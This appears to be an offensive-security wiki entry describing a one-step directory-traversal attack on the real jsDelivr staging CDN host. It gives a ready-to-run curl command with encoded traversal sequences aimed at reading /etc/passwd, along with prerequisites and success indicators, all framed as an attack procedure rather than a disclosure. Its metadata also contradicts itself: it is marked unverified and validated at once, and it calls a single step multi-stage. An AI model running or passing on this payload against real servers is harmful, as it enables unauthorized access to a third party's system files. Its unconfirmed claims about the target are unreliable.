---
id: ac-jsdelivr-traversal-001
tags:
  - directory-traversal
  - path-traversal
  - web-vulnerability
  - file-read
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Directory-Traversal-in-jsDelivr-Staging-Endpoint]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:06.135Z'
description: >-
  A single-stage attack exploiting directory traversal in the jsDelivr staging
  CDN to read restricted system files like /etc/passwd.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Directory Traversal in jsDelivr Staging CDN to Access Sensitive System Files

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Traversal] --> B[File Exfiltration]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-directory-traversal-jsdelivr]]

### Target Environment

- Web-based CDN service (jsDelivr staging endpoint)
- Required services/ports: HTTP/80
- Network access requirements: Direct internet access to staging.jsdelivr.net

### Initial Access Requirements

- No credentials required
- Publicly accessible endpoint
- No prior access needed

## Detailed Attack Procedures

### Step 1: Exploit Path Traversal
procedure: [[procedures/Exploit-Directory-Traversal-in-jsDelivr-Staging-Endpoint]]

**Objective**: Bypass path normalization in the jsDelivr staging CDN to traverse directories and read sensitive system files outside the web root.

**Instructions**: Construct a malicious URL with multiple encoded path traversal sequences (%25c0%25af for '..') to navigate to /etc/passwd. Use [[commands/curl-directory-traversal-jsdelivr]] to fetch the file contents:

```bash
curl "http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd"
```

Verify the response contains user account entries from /etc/passwd.

**Expected Output**: The contents of /etc/passwd, listing usernames, UIDs, GIDs, and home directories.

**Success Indicators**:
- Response includes lines like "root:x:0:0:root:/root:/bin/bash"
- No 404 or access denied errors

## Attack Chain Summary

### Key Achievements

1. Bypassed directory restrictions using encoded traversal payloads
2. Accessed and exfiltrated sensitive system file /etc/passwd
3. Demonstrated potential for broader file disclosure on the server

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
